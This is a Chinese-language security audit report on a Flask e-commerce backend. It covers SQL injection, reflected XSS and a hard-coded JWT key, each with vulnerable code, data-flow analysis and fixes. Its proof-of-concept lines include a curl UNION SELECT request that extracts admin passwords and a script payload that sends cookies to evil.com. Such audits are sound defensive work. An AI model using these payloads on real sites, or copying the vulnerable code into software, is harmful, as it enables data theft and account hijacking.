# WebShop项目代码安全审计报告

**审计任务ID:** TASK-2025-0042
**审计日期:** 2025-01-15
**审计范围:** WebShop电商平台后端代码 (Python/Flask)
**审计版本:** v2.3.1

---

## 审计概述

本次审计针对WebShop电商平台后端代码进行了全面的安全评估，共发现 **3** 个安全漏洞，其中严重 1 个，一般 1 个，提示 1 个。

---

## VULN-001: SQL注入漏洞

**严重性:** 严重
**CVSS评分:** 9.8
**CVSS向量:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
**CWE:** CWE-89: SQL Injection
**置信度:** 确认

### 位置

- **文件路径:** src/api/user_handler.py
- **行号:** 45-58
- **函数名:** get_user_profile()

### 漏洞描述

**漏洞标题:** 用户查询接口SQL注入

**漏洞本质:** 用户输入的 `user_id` 参数未经过滤直接拼接到SQL查询语句中，导致攻击者可以注入恶意SQL代码。

**根因分析:** 开发者使用字符串拼接而非参数化查询来构建SQL语句，且缺乏输入验证机制。

**安全影响:** 攻击者可以绕过身份验证、读取敏感数据、修改或删除数据库记录，甚至执行系统命令。

### 漏洞代码

```python
def get_user_profile(user_id):
    query = "SELECT * FROM users WHERE id = " + user_id
    result = db.execute(query)
    return result.fetchone()
```

### 数据流分析

**污点源 (Source):** HTTP GET 参数 `user_id`，来自 `request.args.get('user_id')`

**传播路径:**
1. `request.args.get('user_id')` — 用户输入进入应用
2. `user_id` 参数传递给 `get_user_profile()` 函数
3. 字符串拼接: `"SELECT * FROM users WHERE id = " + user_id`
4. 拼接后的 `query` 传入 `db.execute(query)`

**汇聚点 (Sink):** `db.execute(query)` — 数据库执行函数

**净化检查:** 无任何输入验证、转义或参数化处理。

**结论:** 污点数据从HTTP请求参数直接传播到数据库执行点，传播链路中无任何安全屏障。

### 利用场景

**攻击步骤:**
1. 攻击者访问用户查询API接口
2. 构造恶意 `user_id` 参数，如 `1 OR 1=1`
3. 发送请求: `GET /api/user?user_id=1 OR 1=1`
4. 应用将恶意SQL发送到数据库执行
5. 攻击者获取所有用户数据

**PoC:**

```bash
curl 'http://target.com/api/user?user_id=1%20UNION%20SELECT%20username,password,null,null%20FROM%20admin_users--'
```

### 影响评估

- **机密性影响:** 高 — 可读取全部数据库数据
- **完整性影响:** 高 — 可修改和删除数据
- **可用性影响:** 中 — 可通过DROP TABLE等操作影响可用性

### 修复建议

**修复说明:** 使用参数化查询替代字符串拼接，同时添加输入验证层。

**修复前代码:**

```python
def get_user_profile(user_id):
    query = "SELECT * FROM users WHERE id = " + user_id
    result = db.execute(query)
    return result.fetchone()
```

**修复后代码:**

```python
def get_user_profile(user_id):
    if not user_id.isdigit():
        raise ValueError("Invalid user_id")
    query = "SELECT * FROM users WHERE id = %s"
    result = db.execute(query, (user_id,))
    return result.fetchone()
```

---

## VULN-002: 跨站脚本 (XSS) 漏洞

**严重性:** 一般
**CVSS评分:** 6.1
**CVSS向量:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
**CWE:** CWE-79: Cross-Site Scripting (Reflected)
**置信度:** 高

### 位置

- **文件路径:** src/templates/search_results.html
- **行号:** 23-23
- **函数名:** N/A (模板文件)

### 漏洞描述

**漏洞标题:** 搜索结果页面反射型XSS

**漏洞本质:** 搜索关键词在结果页面中未经HTML转义直接渲染。

**根因分析:** Jinja2模板中使用了 `| safe` 过滤器或禁用了自动转义，导致用户输入被当作HTML直接输出。

**安全影响:** 攻击者可以构造恶意链接，诱导用户点击后在其浏览器中执行任意JavaScript代码，窃取Cookie或会话令牌。

### 漏洞代码

```html
<h2>搜索结果: {{ query | safe }}</h2>
```

### 数据流分析

**污点源 (Source):** URL查询参数 `q`

**传播路径:**
1. `request.args.get('q')` — 用户搜索输入
2. 传递给模板上下文变量 `query`
3. 模板中 `{{ query | safe }}` 绕过自动转义直接输出

**汇聚点 (Sink):** HTML模板渲染输出

**净化检查:** 使用了 `| safe` 标记，显式跳过了Jinja2的自动转义。

**结论:** 用户输入从URL参数直接传播至HTML输出，`| safe` 过滤器移除了唯一的安全防线。

### 利用场景

**攻击步骤:**
1. 攻击者构造包含恶意脚本的搜索URL
2. 将URL通过钓鱼邮件或社交工程发送给受害者
3. 受害者点击链接，恶意脚本在其浏览器中执行
4. 脚本窃取受害者的会话Cookie并发送到攻击者服务器

**PoC:**

```
http://target.com/search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>
```

### 影响评估

- **机密性影响:** 低 — 可窃取特定用户的会话信息
- **完整性影响:** 低 — 可在用户浏览器中伪造页面内容
- **可用性影响:** 低

### 修复建议

**修复说明:** 移除 `| safe` 过滤器，让Jinja2自动转义机制正常工作。

**修复前代码:**

```html
<h2>搜索结果: {{ query | safe }}</h2>
```

**修复后代码:**

```html
<h2>搜索结果: {{ query | e }}</h2>
```

---

## VULN-003: 硬编码密钥

**严重性:** 提示
**CWE:** CWE-798: Use of Hard-coded Credentials
**置信度:** 确认

### 位置

- **文件路径:** src/config/settings.py
- **行号:** 12-12
- **函数名:** N/A (模块级常量)

### 漏洞描述

**漏洞标题:** 配置文件中硬编码JWT密钥

**漏洞本质:** JWT签名密钥以明文形式硬编码在源代码中。

**根因分析:** 开发者为简便将密钥直接写入配置文件，未使用环境变量或密钥管理服务。

**安全影响:** 任何能访问源代码的人都可获取JWT密钥，进而伪造任意用户的认证令牌。

### 漏洞代码

```python
JWT_SECRET_KEY = "my-super-secret-key-12345"
```

### 修复建议

**修复说明:** 使用环境变量存储密钥，避免在代码仓库中暴露敏感信息。

**修复前代码:**

```python
JWT_SECRET_KEY = "my-super-secret-key-12345"
```

**修复后代码:**

```python
import os
JWT_SECRET_KEY = os.environ.get("JWT_SECRET_KEY")
if not JWT_SECRET_KEY:
    raise RuntimeError("JWT_SECRET_KEY environment variable is not set")
```

---

## 审计结论

| 严重性 | 数量 |
| ------ | ---- |
| 致命   | 0    |
| 严重   | 1    |
| 一般   | 1    |
| 提示   | 1    |

建议优先修复 VULN-001 (SQL注入) 和 VULN-002 (XSS) 漏洞，VULN-003 (硬编码密钥) 建议在下一版本迭代中完成改进。
